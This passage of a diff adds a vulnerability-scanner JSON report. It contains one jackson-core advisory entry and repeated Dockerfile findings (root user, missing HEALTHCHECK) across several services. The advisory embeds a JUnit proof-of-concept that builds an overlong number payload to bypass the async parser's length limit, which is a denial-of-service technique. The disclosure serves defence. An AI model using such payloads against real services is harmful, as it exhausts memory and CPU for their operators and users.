+          "PkgID": "com.fasterxml.jackson.core:jackson-core:2.17.0::acf0ecc4",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.17.0",
+            "UID": "9ed212412a627a27"
+          },
+          "InstalledVersion": "2.17.0",
+          "FixedVersion": "2.21.1, 2.18.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-72hv-8253-57qq",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:6d62f7a50ada74323fdb267df9246966be16acee848a2a5aaeb3d13e7c5107c0",
+          "Title": "jackson-core: Number Length Constraint Bypass in Async Parser Leads to Potential DoS Condition",
+          "Description": "### Summary\nThe non-blocking (async) JSON parser in `jackson-core` bypasses the `maxNumberLength` constraint (default: 1000 characters) defined in `StreamReadConstraints`. This allows an attacker to send JSON with arbitrarily long numbers through the async parser API, leading to excessive memory allocation and potential CPU exhaustion, resulting in a Denial of Service (DoS).\n\nThe standard synchronous parser correctly enforces this limit, but the async parser fails to do so, creating an inconsistent enforcement policy.\n\n### Details\nThe root cause is that the async parsing path in `NonBlockingUtf8JsonParserBase` (and related classes) does not call the methods responsible for number length validation.\n\n- The number parsing methods (e.g., `_finishNumberIntegralPart`) accumulate digits into the `TextBuffer` without any length checks.\n- After parsing, they call `_valueComplete()`, which finalizes the token but does **not** call `resetInt()` or `resetFloat()`.\n- The `resetInt()`/`resetFloat()` methods in `ParserBase` are where the `validateIntegerLength()` and `validateFPLength()` checks are performed.\n- Because this validation step is skipped, the `maxNumberLength` constraint is never enforced in the async code path.\n\n### PoC\nThe following JUnit 5 test demonstrates the vulnerability. It shows that the async parser accepts a 5,000-digit number, whereas the limit should be 1,000.\n\n```java\npackage tools.jackson.core.unittest.dos;\n\nimport java.nio.charset.StandardCharsets;\n\nimport org.junit.jupiter.api.Test;\n\nimport tools.jackson.core.*;\nimport tools.jackson.core.exc.StreamConstraintsException;\nimport tools.jackson.core.json.JsonFactory;\nimport tools.jackson.core.json.async.NonBlockingByteArrayJsonParser;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\n/**\n * POC: Number Length Constraint Bypass in Non-Blocking (Async) JSON Parsers\n *\n * Authors: sprabhav7, rohan-repos\n * \n * maxNumberLength default = 1000 characters (digits).\n * A number with more than 1000 digits should be rejected by any parser.\n *\n * BUG: The async parser never calls resetInt()/resetFloat() which is where\n * validateIntegerLength()/validateFPLength() lives. Instead it calls\n * _valueComplete() which skips all number length validation.\n *\n * CWE-770: Allocation of Resources Without Limits or Throttling\n */\nclass AsyncParserNumberLengthBypassTest {\n\n    private static final int MAX_NUMBER_LENGTH = 1000;\n    private static final int TEST_NUMBER_LENGTH = 5000;\n\n    private final JsonFactory factory = new JsonFactory();\n\n    // CONTROL: Sync parser correctly rejects a number exceeding maxNumberLength\n    @Test\n    void syncParserRejectsLongNumber() throws Exception {\n        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);\n\t\t\n\t\t// Output to console\n        System.out.println(\"[SYNC] Parsing \" + TEST_NUMBER_LENGTH + \"-digit number (limit: \" + MAX_NUMBER_LENGTH + \")\");\n        try {\n            try (JsonParser p = factory.createParser(ObjectReadContext.empty(), payload)) {\n                while (p.nextToken() != null) {\n                    if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {\n                        System.out.println(\"[SYNC] Accepted number with \" + p.getText().length() + \" digits — UNEXPECTED\");\n                    }\n                }\n            }\n            fail(\"Sync parser must reject a \" + TEST_NUMBER_LENGTH + \"-digit number\");\n        } catch (StreamConstraintsException e) {\n            System.out.println(\"[SYNC] Rejected with StreamConstraintsException: \" + e.getMessage());\n        }\n    }\n\n    // VULNERABILITY: Async parser accepts the SAME number that sync rejects\n    @Test\n    void asyncParserAcceptsLongNumber() throws Exception {\n        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);\n\n        NonBlockingByteArrayJsonParser p =\n            (NonBlockingByteArrayJsonParser) factory.createNonBlockingByteArrayParser(ObjectReadContext.empty());\n        p.feedInput(payload, 0, payload.length);\n        p.endOfInput();\n\n        boolean foundNumber = false;\n        try {\n            while (p.nextToken() != null) {\n                if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {\n                    foundNumber = true;\n                    String numberText = p.getText();\n                    assertEquals(TEST_NUMBER_LENGTH, numberText.length(),\n                        \"Async parser silently accepted all \" + TEST_NUMBER_LENGTH + \" digits\");\n                }\n            }\n            // Output to console\n            System.out.println(\"[ASYNC INT] Accepted number with \" + TEST_NUMBER_LENGTH + \" digits — BUG CONFIRMED\");\n            assertTrue(foundNumber, \"Parser should have produced a VALUE_NUMBER_INT token\");\n        } catch (StreamConstraintsException e) {\n            fail(\"Bug is fixed — async parser now correctly rejects long numbers: \" + e.getMessage());\n        }\n        p.close();\n    }\n\n    private byte[] buildPayloadWithLongInteger(int numDigits) {\n        StringBuilder sb = new StringBuilder(numDigits + 10);\n        sb.append(\"{\\\"v\\\":\");\n        for (int i = 0; i \u003c numDigits; i++) {\n            sb.append((char) ('1' + (i % 9)));\n        }\n        sb.append('}');\n        return sb.toString().getBytes(StandardCharsets.UTF_8);\n    }\n}\n\n```\n\n\n### Impact\nA malicious actor can send a JSON document with an arbitrarily long number to an application using the async parser (e.g., in a Spring WebFlux or other reactive application). This can cause:\n1.  **Memory Exhaustion:** Unbounded allocation of memory in the `TextBuffer` to store the number's digits, leading to an `OutOfMemoryError`.\n2.  **CPU Exhaustion:** If the application subsequently calls `getBigIntegerValue()` or `getDecimalValue()`, the JVM can be tied up in O(n^2) `BigInteger` parsing operations, leading to a CPU-based DoS.\n\n### Suggested Remediation\n\nThe async parsing path should be updated to respect the `maxNumberLength` constraint. The simplest fix appears to ensure that `_valueComplete()` or a similar method in the async path calls the appropriate validation methods (`resetInt()` or `resetFloat()`) already present in `ParserBase`, mirroring the behavior of the synchronous parsers.\n\n**NOTE:** This research was performed in collaboration with [rohan-repos](https://github.com/rohan-repos)",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+              "V40Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/b0c428e6f993e1b5ece5c1c3cb2523e887cd52cf",
+            "https://github.com/FasterXML/jackson-core/pull/1555",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq"
+          ],
+          "PublishedDate": "2026-02-28T02:01:05Z",
+          "LastModifiedDate": "2026-04-07T16:30:17Z"
+        }
+      ]
+    },
+    {
+      "Target": "ai-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "frontend/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-analytics-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-auth-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-connector-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-event-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-management-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-scheduler-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "platform/ruleforge-solver-service/Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    }
+  ]
+}
